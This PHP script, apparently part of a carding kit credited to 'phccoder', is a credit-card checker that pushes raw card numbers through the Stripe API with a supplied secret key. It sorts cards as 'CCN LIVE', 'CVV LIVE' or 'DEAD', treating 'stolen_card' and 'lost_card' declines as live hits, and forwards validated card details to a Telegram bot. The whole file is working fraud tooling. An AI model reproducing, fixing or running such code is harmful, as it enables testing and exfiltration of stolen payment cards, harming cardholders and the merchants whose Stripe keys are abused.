<?php
//Script Author: phccoder https://t.me/PHCC0D3r

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Include Setup]==========================================*/
include 'preset.php';

/*===[HTTP Processes]=========================================*/
/* 1st Request */
$resp1 = http_request('https://api.stripe.com/v1/customers', 'POST', 'email='.$email.'&description=phccoder&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US', $sk. ':');
$curl1 = $resp1['body'];
if ($resp1['errno'] || $curl1 === false) {
    phc_log('stripe4', '1st request failed errno='.$resp1['errno'].' http='.$resp1['code']);
}

/* 1st Request Response */
$res1 = json_decode($curl1, 1);
$cus = $res1['id'];

if(isset($res1['id'])){
    /* 2nd Request */
    $resp2 = http_request('https://api.stripe.com/v1/setup_intents', 'POST', 'payment_method_data[type]=card&customer='.$res1["id"].'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yyyy.'&payment_method_data[card][cvc]='.$cvv.'&usage=off_session', $sk . ':');
    $curl2 = $resp2['body'];
    if ($resp2['errno'] || $curl2 === false) {
        phc_log('stripe4', '2nd request failed errno='.$resp2['errno'].' http='.$resp2['code']);
    }

    /* 2nd Request Response */
    $res2 = json_decode($curl2, 1);
    $seti = $res2['id'];

}

if(isset($res2['id'])){
    /* 3rd Request */
    $resp3 = http_request('https://api.stripe.com/v1/payment_methods/'.$res2["payment_method"].'/attach', 'POST', 'customer='.$res1['id'].'', $sk . ':');
    $curl3 = $resp3['body'];
    if ($resp3['errno'] || $curl3 === false) {
        phc_log('stripe4', '3rd request failed errno='.$resp3['errno'].' http='.$resp3['code']);
    }

    /* 3rd Request Response */
    $res3 = json_decode($curl3, 1);

}


/*===[cURL Response Setup]====================================*/
if(isset($res1['error'])){
    //DEAD
    $code = $res1['error']['code'];
    $decline_code = $res1['error']['decline_code'];
    $message = $res1['error']['message'];

    if(isset($res1['error']['decline_code'])){
        $codex = $decline_code;
    }else{
        $codex = $code;
    }
    $err = ''.$res1['error']['message'].' '.$codex;
    
    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        //CCN LIVE
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
        //CVV LIVE: Insufficient Funds
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "1"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
            }
        }
        EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
    }elseif($code == "lost_card"||$decline_code == "lost_card"){
        //CCN LIVE: Lost Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
        //CCN LIVE: Stolen Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        EchoMessage('DEAD',$cc_info.' >> SK Error: Test mode only - account cannot make live charges (see CHECK SK) ');
    }elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
        //INTEGRATION ERROR
        EchoMessage('DEAD',$cc_info.' >> SK Error: Integration');
    }elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
        //VERIFY NUMBER
        EchoMessage('DEAD',$cc_info.' >> SK Error: Verify Phone Number');
    }else{
        //DEAD
        EchoMessage('DEAD',$cc_info.' >> '.$err);
    }
}else{
    if(isset($res2['error'])){
        //DEAD
        $code = $res2['error']['code'];
        $decline_code = $res2['error']['decline_code'];
        $message = $res2['error']['message'];
        if(isset($res2['error']['decline_code'])){
            $codex = $decline_code;
        }else{
            $codex = $code;
        }
        $err = ''.$res2['error']['message'].' '.$codex;

        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
            //CCN LIVE
            if(isset($telebot) && $telebot != ""){
	            if($tele_msg == "2"|| $tele_msg == "3") {
	                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
	            }
	        }
	        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
            //CVV LIVE: Insufficient Funds
            if(isset($telebot) && $telebot != ""){
	            if($tele_msg == "1"|| $tele_msg == "3") {
	                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
	            }
	        }
	        EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
        }elseif($code == "lost_card"||$decline_code == "lost_card"){
            //CCN LIVE: Lost Card
	        if(isset($telebot) && $telebot != ""){
	            if($tele_msg == "2"|| $tele_msg == "3") {
	                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
	            }
	        }
	        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
            //CCN LIVE: Stolen Card
	        if(isset($telebot) && $telebot != ""){
	            if($tele_msg == "2"|| $tele_msg == "3") {
	                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
	            }
	        }
	        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
	        //TESTMODE CHARGES
	        EchoMessage('DEAD',$cc_info.' >> SK Error: Test mode only - account cannot make live charges (see CHECK SK) ');
    	}elseif(strpos($curl2, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
            //TURN ON INTEGRATION
            EchoMessage('DEAD',$cc_info.' >> SK Error: Integration');
        }elseif(strpos($curl2, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
	        //VERIFY NUMBER
	        EchoMessage('DEAD',$cc_info.' >> SK Error: Verify Phone Number');
	    }else{
	        //DEAD
	        EchoMessage('DEAD',$cc_info.' >> '.$err);
	    }
    }else{
        if(isset($res3['error'])){
            //DEAD
            $code = $res3['error']['code'];
            $decline_code = $res3['error']['decline_code'];
            $message = $res3['error']['message'];
            if(isset($res3['error']['decline_code'])){
                $codex = $decline_code;
            }else{
                $codex = $code;
            }
            $err = ''.$res3['error']['message'].' '.$codex;

            if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
                //CCN LIVE
                if(isset($telebot) && $telebot != ""){
	                if($tele_msg == "2"|| $tele_msg == "3") {
	                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
	                }
	            }
                EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
            }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
                //CVV LIVE: Insufficient Funds
                if(isset($telebot) && $telebot != ""){
	                if($tele_msg == "1"|| $tele_msg == "3") {
	                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
	                }
	            }
	            EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
            }elseif($code == "lost_card"||$decline_code == "lost_card"){
                //CCN LIVE: Lost Card
                if(isset($telebot) && $telebot != ""){
	                if($tele_msg == "2"|| $tele_msg == "3") {
	                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
	                }
	            }
	            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
            }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
                //CCN LIVE: Stolen
                if(isset($telebot) && $telebot != ""){
	                if($tele_msg == "2"|| $tele_msg == "3") {
	                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
	                }
	            }
	            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
            }else{
                //DEAD
                EchoMessage('DEAD',$cc_info.' >> '.$err);
            }
        }else{
            $cvc_res3 = $res3['card']['checks']['cvc_check'];
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                    }
                }
                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res3);
            }else{
                //DEAD
                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res3);
            }
        }
    } 
}

if ($testMode) {
    echo '<pre>';
    echo "1st cURL <br>";
    echo json_encode($res1, JSON_PRETTY_PRINT);
    if (isset($res1['id'])) {
        echo "<br><br>2nd cURL <br>";
        echo json_encode($res2, JSON_PRETTY_PRINT);
    }
    if (isset($res2['id'])) {
        echo "<br><br>3rd cURL <br>";
        echo json_encode($res3, JSON_PRETTY_PRINT);
    }
}

?>